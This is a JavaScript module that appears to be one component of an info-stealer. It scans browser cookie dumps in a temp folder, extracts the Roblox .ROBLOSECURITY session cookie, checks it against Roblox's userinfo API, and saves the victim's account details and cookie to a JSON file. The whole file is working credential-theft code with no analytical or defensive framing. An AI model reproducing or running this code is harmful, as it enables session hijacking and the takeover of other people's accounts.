const { join } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');
const { searchForFile } = require('../util/dir');
const axios = require('axios');
const { writeFileSync } = require('fs');

module.exports = async () => {
  for (const browser of fs.readdirSync(join(tempFolder, 'Browsers')).filter(f => f.split('.').length >= 1)) {
    const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
    let line = await searchForFile(file, 500);
    line = fs.readFileSync(file).toString().split('\n')
      .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
    if (!line) return;
    const cookie = line.split(',')[2];
    fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
  }

  const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
  if (!file || file.trim() === '') return;
  const jsonFile = join(tempFolder, 'Roblox.json');
  const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
    headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
  });
  account.data.cookie = file.replaceAll('"', '');
  writeFileSync(jsonFile, JSON.stringify(account.data));
};
